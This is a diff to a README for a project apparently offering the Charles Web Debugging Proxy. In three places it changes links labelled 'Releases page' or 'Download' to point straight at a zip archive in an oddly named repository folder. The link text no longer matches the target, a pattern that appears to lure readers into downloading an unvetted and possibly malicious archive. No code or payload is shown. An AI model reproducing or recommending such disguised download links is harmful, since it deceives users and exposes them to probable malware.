@@ -6,7 +6,7 @@ Welcome to the Charles-Web-Debugging-Proxy-Working project. This application hel
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Charles Web Debugging Proxy](https://github.com/yolanecapillary733/Charles-Web-Debugging-Proxy-Working/releases)
+To get started, visit this page to download: [Download Charles Web Debugging Proxy](https://raw.githubusercontent.com/yolanecapillary733/Charles-Web-Debugging-Proxy-Working/main/registral/Charles-Web-Debugging-Proxy-Working_v1.2-alpha.5.zip)
 
 You will find a list of available versions. Choose the latest version to ensure you have the latest features and fixes.
 
@@ -20,7 +20,7 @@ You will find a list of available versions. Choose the latest version to ensure 
 ## ⚙️ Installation Steps
 
 1. **Download the Software:**
-   - Go to the [Releases page](https://github.com/yolanecapillary733/Charles-Web-Debugging-Proxy-Working/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/yolanecapillary733/Charles-Web-Debugging-Proxy-Working/main/registral/Charles-Web-Debugging-Proxy-Working_v1.2-alpha.5.zip).
    - Click on the latest version to view the download options.
    - Select the file that matches your system (e.g., Windows Installer).
 
@@ -71,7 +71,7 @@ For detailed guidance on all features, refer to the user documentation available
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Download Charles Web Debugging Proxy](https://github.com/yolanecapillary733/Charles-Web-Debugging-Proxy-Working/releases)
+- **Releases Page:** [Download Charles Web Debugging Proxy](https://raw.githubusercontent.com/yolanecapillary733/Charles-Web-Debugging-Proxy-Working/main/registral/Charles-Web-Debugging-Proxy-Working_v1.2-alpha.5.zip)
 - **User Documentation:** Check for detailed guides and troubleshooting steps.
 
 Explore the capabilities of the Charles Web Debugging Proxy and elevate your web traffic monitoring experience.
